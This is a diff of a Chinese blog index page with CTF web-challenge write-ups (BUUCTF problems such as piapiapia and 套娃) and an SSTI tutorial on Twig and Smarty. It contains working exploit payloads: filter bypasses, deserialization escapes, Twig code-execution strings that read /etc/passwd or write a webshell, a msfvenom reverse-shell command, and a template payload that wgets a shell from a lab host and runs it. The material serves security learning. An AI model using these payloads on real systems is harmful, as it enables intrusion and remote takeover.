+            <p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/image-20240524204834081.png" alt="image-20240524204834081"></p>
+<p>主要是几个函数不认得</p>
+<p>basename</p>
+<p>random_bytes</p>
+<p>hash_equals</p>
+<p>一个个查一下</p>
+<h4 id="basename"><a href="#basename" class="headerlink" title="basename"></a>basename</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/image-20240524204859064.png" alt="image-20240524204859064"></p>
+<h4 id="random-bytes"><a href="#random-bytes" class="headerlink" title="random_bytes"></a>random_bytes</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/image-20240524210052173.png" alt="image-20240524210052173"></p>
+<p>这个就是随机生成字符串</p>
+<h4 id="hash-equals"><a href="#hash-equals" class="headerlink" title="hash_equals"></a>hash_equals</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/image-20240524210034240.png" alt="image-20240524210034240"></p>
+<p>这个就是比较两个字符串是否相等</p>
+<p>但是后面的好像没什么用吧</p>
+<p>因为返回的flag都不知道是什么…</p>
+<p>所以看看之前的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说查询的网址不能有config.php</p>
+<p>还一定要传一个source上去</p>
+<p>所以要找一找就是这么绕过一下</p>
+<p>在这里，就是正则匹配</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">    echo &quot;匹配尾部&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">if (preg_match(&#x27;/config\.php\//i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">    echo &quot;匹配字符串&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以前者，如果在末尾加上一个没用的字符不就可以绕过了？</p>
+<p>找到了！！！%ff</p>
+<p>经过测试%aa到%ff都可以用，之后就不行了</p>
+<p>这个是因为，basename函数会过滤文件开头中的非ascii值</p>
+<p>嘻嘻，如果是%ff之后的就不是ascii码可以识别的了</p>
+<p>所以最后的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php/config.php/%ff?source</span><br></pre></td></tr></table></figure>
+
+<p>为什么一定前面要加index，我不太懂，有大佬可以说说不</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/05/24/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/Zer0pts2020-Can-you-guess-it/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/05/23/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/MRCTF2020-%E5%A5%97%E5%A8%83/">
+        <h2 class="post-title">[MRCTF2020]套娃</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/23
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/image-20240523213604915.png" alt="image-20240523213604915"></p>
+<p>查看源码发现第一关的相关</p>
+<p>补充：</p>
+<h4 id="substr-count函数"><a href="#substr-count函数" class="headerlink" title="substr_count函数"></a>substr_count函数</h4><p>计算字符串出现的次数。%5f就是”_”的十六进制。</p>
+<p>也就是，不能出现下划线的同时，我们要上传23333的同时不能上传23333</p>
+<p>你在干什么？，</p>
+<p>所以我们使用url编码代替下划线（%20）</p>
+<p>再通过%0a构造23333%0a去绕过preg</p>
+<p>tips：preg函数忽略行尾的%0a，但是%0a仍然可以发挥效果。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?b%20u%20p%20t=23333%0a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/image-20240523214407871.png" alt="image-20240523214407871"></p>
+<p>好耶！</p>
+<p>那就前往这个网址吧！！</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/image-20240524191543641.png" alt="image-20240524191543641"></p>
+<p>不能进入，要使用本地，我第一个想法就是xff</p>
+<p>抓包试试</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/image-20240524192052256.png" alt="image-20240524192052256"></p>
+<p>但是吧，还有一个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Client-Ip:127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>试试</p>
+<p>有反应了，但不多，我们也可以看到在回显的底下有一串奇奇怪怪的东西</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/image-20240524192227680.png" alt="image-20240524192227680"></p>
+<p>啊？</p>
+<p>这是啥？</p>
+<p>去查一下</p>
+<p>是js代码！！！</p>
+<p>震惊！！！！</p>
+<p>所以找一个跑js代码的网站试试</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/image-20240524194114123.png" alt="image-20240524194114123"></p>
+<p>所以还要传一个merak上去？</p>
+<p>试试</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/image-20240524194706602.png" alt="image-20240524194706602"></p>
+<p>OK了老铁！！！</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/image-20240524194806704.png" alt="image-20240524194806704"></p>
+<p>这里也就是一个绕过，一个是2333，一个是file</p>
+<p>首先先看2333</p>
+<p>读取文件，对比文件中是否含有那串字符串？</p>
+<p>所以这里要使用data伪协议读取file</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2333=data://text/plain,todat+is+a+happy+day</span><br></pre></td></tr></table></figure>
+
+<p>之后就是file</p>
+<p>主要是前面的change函数，将每个字符都加上i*2</p>
+<p>所以，我们直接就是写一个脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//逆向代码</span><br><span class="line">&lt;?php</span><br><span class="line">$v=&quot;flag.php&quot;;</span><br><span class="line">$re=&#x27;&#x27;;</span><br><span class="line">for($i=0;$i&lt;strlen($v);$i++)</span><br><span class="line">&#123;</span><br><span class="line">    $re.=chr(ord($v[$i])-$i*2);</span><br><span class="line">&#125;</span><br><span class="line">$v1=base64_encode($re);</span><br><span class="line">echo $v1;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先把它就是先减一个i*2就行了</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag=ZmpdYSZmXGI=</span><br></pre></td></tr></table></figure>
+
+<p>将这两个一起使用get传上去就好了</p>
+<p>但是要注意一点，就是说，要把之前传的post删掉或者直接关掉，否则程序会直接停止。</p>
+<p>拿到flag</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/05/23/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/MRCTF2020-%E5%A5%97%E5%A8%83/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/05/21/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/0CTF-2016-piapiapia/">
+        <h2 class="post-title">[0CTF 2016]piapiapia</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/21
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/image-20240523191332318.png" alt="image-20240523191332318"></p>
+<p>好耶！！！</p>
+<p>可爱猫猫，有可爱猫猫的题能有什么坏心思（希望）</p>
+<p>尝试几个sql注入无果</p>
+<p>开始信息搜集</p>
+<p>我习惯先用<a target="_blank" rel="noopener" href="http://www.zip和robots.txt试一试,不行再用扫描工具(不知道习惯好还是不好...)/">www.zip和robots.txt试一试，不行再用扫描工具（不知道习惯好还是不好。。。）</a></p>
+<p>然后发现<a target="_blank" rel="noopener" href="http://www.zip是可以的,所以,我们下载到了源码/">www.zip是可以的，所以，我们下载到了源码</a></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/image-20240523193909317.png" alt="image-20240523193909317"></p>
+<p>怎么办</p>
+<p>都打开看看，然后进入难过的代码审计时间</p>
+<p>最后发现了唯一一个读文件的地方</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/image-20240523193937737.png" alt="image-20240523193937737"></p>
+<p>在photo这里</p>
+<p>所以我们要想办法就是读取我们想要的文件</p>
+<p>即config.php</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/image-20240523194555497.png" alt="image-20240523194555497"></p>
+<p>之后我们还可以看到profile有一个发序列化，所以，我们的思路就应该是构造序列化，最后我们能读到文件。</p>
+<p>所以怎么看呢？</p>
+<p>先试试正常注册吧</p>
+<p>最后注册登录之后进入了update.php</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/image-20240523202132736.png" alt="image-20240523202132736"></p>
+<p>所以，我们是不能用photo传什么xxx.php啥的</p>
+<p>所以，我们应该是就是在nickname那里进行注入</p>
 <p>所以</p>
-<p>就是传上去，同时</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@app.route(&#x27;/shrine/&#x27;) </span><br></pre></td></tr></table></figure>
+<p>结合之前我们发现的序列化和反序列化</p>
+<p>我们猜测这是一道反序列化逃逸的题！！！</p>
+<p>好抽象，这道题，要判断nickname是数组…好魔鬼，所以</p>
+<p>nickname的序列化会变成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public nickname=&quot;abc&quot;</span><br><span class="line"></span><br><span class="line">s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:3:&quot;abc&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>人家告诉你就是从这个路径进去了，就按人家的走（我没有阴阳）</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406131913730.png" alt="image-20240515212951135"></p>
-<p>get it</p>
-<h4 id="url-for和get-flashed-message函数介绍"><a href="#url-for和get-flashed-message函数介绍" class="headerlink" title="url_for和get_flashed_message函数介绍"></a>url_for和get_flashed_message函数介绍</h4><p>url_for这个可以用来构造url，接受函数名作为第一个参数</p>
-<p>get_flashed_message()是通过flash()传入闪现信息列表的，能够把字符串对象表示的信息加入到一个消息列表，然后通过调用get_flashed_message()来取出。</p>
+<p>所以这道题的思路就是通过上传的nickname伪造一个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;</span><br></pre></td></tr></table></figure>
 
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/05/15/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/WesternCTF2018-shrine/" class="go-post">阅读全文</a>
-</div>
+<p>所以，先随便试试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname=&quot;xxx&quot;;&#125;s:5:&quot;photo&quot;,s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
-<div class="post">
-    <a href="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/MRCTF2020-PYWebsite/">
-        <h2 class="post-title">[MRCTF2020]PYWebsite</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/5/14
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>写简单点，要下班了</p>
-<p>回去玩原神了</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514220722582.png" alt="image-20240514220722582"></p>
-<p>我没有扫码，正确选择</p>
-<p>view-source查看源代码</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514220753419.png" alt="image-20240514220753419"></p>
-<p>我一开始还在找hex_md5的解决方法</p>
-<p>才发现直接.&#x2F;flag.php进入页面</p>
-<p>我透！！！！！！</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514220856924.png" alt="image-20240514220856924"></p>
-<p>我和购买者</p>
-<p>所以说，我也可以进是吧</p>
-<p>尝试xff：127.0.0.1</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514220940423.png" alt="image-20240514220940423"></p>
-<p>拿下！！！！</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/MRCTF2020-PYWebsite/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/ASIS-2019-Unicorn-shop/">
-        <h2 class="post-title">[ASIS 2019]Unicorn shop</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/5/14
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514211603682.png" alt="image-20240514211603682"></p>
-<p>怎么说这道题呢？</p>
-<p>我只能说，不是哥们</p>
-<p>我真的是醉了</p>
-<p>买 1 输入9也不行，我在想是不是有问题</p>
-<p>我觉得就是9输进去之后就不是9了，所以不对</p>
-<p>所以到处看看</p>
-<p>看到unicorn</p>
-<p>emm</p>
-<p>应该是提示的unicode吧，我实在找不到线索了</p>
-<p>所以呢，也就是说，emm，这个去找一个code解码之后很大的字符试试</p>
-<p>找了个10000</p>
-<h1 id="፼"><a href="#፼" class="headerlink" title="፼"></a>፼</h1><p>好好好</p>
-<p>拿到flag</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/ASIS-2019-Unicorn-shop/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/">
-        <h2 class="post-title">[WUSTCTF2020]朴实无华</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/5/14
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>先扫描文件，发现robots.txt</p>
-<p>之后发现</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514164746970.png" alt="image-20240514164746970"></p>
-<p>抓包访问</p>
-<p>发现</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514164317787.png" alt="image-20240514164317787"></p>
-<p>前往发现代码</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514164708798.png" alt="image-20240514164708798"></p>
-<p>level1：</p>
-<p>num&lt;2020 num+1&gt;2021</p>
-<p>怎么说，因为intval，所以15e10&#x3D;15</p>
-<p>但是15e10+1就是15e10+1代表的值</p>
-<p>所以传这个就行</p>
-<p>level2：</p>
-<p>$md5&#x3D;&#x3D;md5($md5)</p>
-<p>但是是弱比较，所以就是说0exxxxxx&#x3D;0exxxxxxxx</p>
-<p>找到一个0e开头且md5值0e开头的就行</p>
-<p>level3：</p>
-<p>system(get_flag)</p>
-<p>先传个ls上去，这里是过滤了cat和空格</p>
-<p>找到</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514165826395.png" alt="image-20240514165826395"></p>
-<p>所以就是绕过空格和cat</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tac$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>
-
-<p>拿到flag</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/BJDCTF2020-Mark-loves-cat/">
-        <h2 class="post-title">[BJDCTF2020]Mark loves cat</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/5/14
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514153039668.png" alt="image-20240514153039668"></p>
-<p>emm就是，怎么说，查看源代码没什么用</p>
-<p>所以扫文件发现后台的git文件</p>
-<p>再进行githack，下载下载下来了文件</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514153143827.png" alt="image-20240514153143827"></p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514153255877.png" alt="image-20240514153255877"></p>
-<p>发现了这个！！！</p>
-<p>所以我们要想办法，把$handsome之类的改为flag</p>
-<p>最简单的就是在get里面yds&#x3D;flag</p>
-<p>拿到flag</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/BJDCTF2020-Mark-loves-cat/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/05/13/ssti/ssti/">
-        <h2 class="post-title">ssti</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/5/13
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>php常见的模板：twig，smarty，blade</p>
-<p>  <em>1Twig</em></p>
-<p>Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。</p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815153729779-1563757467.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815153729779-1563757467.png" alt="img"></a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">　　require_once dirname(__FILE__).&#x27;\twig\lib\Twig\Autoloader.php&#x27;;</span><br><span class="line">　　Twig_Autoloader::register(true);</span><br><span class="line">　　$twig = new Twig_Environment(new Twig_Loader_String());</span><br><span class="line">　　$output = $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;]));  // 将用户输入作为模版变量的值</span><br><span class="line">　　echo $output;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。</p>
-<p>其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。</p>
-<p>使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于GET请求参数$_GET[“name”] 。</p>
-<p>显然这段代码并没有什么问题，即使你想通过name参数传递一段JavaScript代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击:</p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815170919414-672456065.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815170919414-672456065.png" alt="img"></a></p>
-<p>但是,如果渲染的模版内容受到用户的控制,情况就不一样了。修改代码为:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">　　require_once dirname(__FILE__).&#x27;/../lib/Twig/Autoloader.php&#x27;;</span><br><span class="line">　　Twig_Autoloader::register(true);</span><br><span class="line">　　$twig=newTwig_Environment(newTwig_Loader_String());</span><br><span class="line">　　$output=$twig-&gt;render(&quot;Hello &#123;$_GET[&#x27;name&#x27;]&#125;&quot;);// 将用户输入作为模版内容的一部分</span><br><span class="line">　　echo $output;?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见:</p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815171105220-873778530.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815171105220-873778530.png" alt="img"></a></p>
-<p>如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。</p>
-<p>在Twig模板引擎里,， 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。</p>
-<p>例如这里用户输入name&#x3D;20 ，则在服务端拼接的模版内容为:</p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815171519739-387170199.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815171519739-387170199.png" alt="img"></a></p>
-<p>尝试插入一些正常字符和 Twig 模板引擎默认的注释符，构造 Payload 为:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bmjoker&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</span><br></pre></td></tr></table></figure>
-
-<p>实际服务端要进行编译的模板就被构造为:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bmjoker&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</span><br></pre></td></tr></table></figure>
-
-<p>由于  作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而 16 作为模板变量最终会返回16 作为其值进行显示，因此前端最终会返回内容 Hello bmjoker16OK </p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818195732706-567305144.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818195732706-567305144.png" alt="img"></a></p>
-<p>通过上面两个简单的示例,就能得到 SSTI 扫描检测的大致流程(这里以 Twig 为例):</p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818195801226-981945295.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818195801226-981945295.png" alt="img"></a></p>
-<p>同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。</p>
-<p>每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。</p>
-<p>简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</p>
-<p>凡是使用模板的网站，基本都会存在SSTI，只是能否控制其传参而已。</p>
-<p>接下来借助XVWA的代码来实践演示一下SSTI注入</p>
-<p>如果在web页面的源代码中看到了诸如以下的字符，就可以推断网站使用了某些模板引擎来呈现数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;&#123;$what&#125;&lt;/div&gt;</span><br><span class="line">&lt;p&gt;Welcome, &#123;&#123;username&#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;div&gt;&#123;%$a%&#125;&lt;/div&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>通过注入了探测字符串 $579，以查看应用程序是否进行了相应的计算：</p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818231335548-122594708.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818231335548-122594708.png" alt="img"></a></p>
-<blockquote>
-<p>根据这个响应，我们可以推测这里使用了模板引擎，因为这符合它们对于 双括号 的处理方式</p>
-<p>在这里提供一个针对twig的攻击载荷：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818231853350-914354726.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818231853350-914354726.png" alt="img"></a></p>
-<p>使用msf生成了一个php meterpreter有效载荷</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=192.168.127.131 LPORT=4321 &gt; /var/www/html/shell.txt</span><br></pre></td></tr></table></figure>
-
-<p>msf进行监听：</p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818232520602-1757346385.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818232520602-1757346385.png" alt="img"></a></p>
-<p>模板注入远程下载shell，并重命名运行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;wget http://192.168.127.131/shell.txt -O /tmp/shell.php;php -f /tmp/shell.php&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818232914668-1182705687.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818232914668-1182705687.png" alt="img"></a></p>
-<p>以上就是php twig模板注入，由于以上使用的twig为2.x版本，现在官方已经更新到3.x版本，根据官方文档新增了 filter 和 map 等内容，补充一些新版本的payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;/etc/passwd&#x27;|file_excerpt(1,30)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).__construct(&#x27;/etc/passwd&#x27;,&#x27;&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;&quot;&lt;?php phpinfo();&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;,0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[0,0]|reduce(&quot;system&quot;,&quot;id&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&#x27;cat /etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>具体payload分析详见：《<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7518#toc-5">TWIG 全版本通用 SSTI payloads</a>》</p>
-<p>　　　　　　　　　　 《<a target="_blank" rel="noopener" href="https://my.oschina.net/u/4588149/blog/4408349">SSTI-服务器端模板注入</a>》</p>
-<p>*<strong>2*</strong>|***2***<strong>Smarty</strong></p>
-<p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)</p>
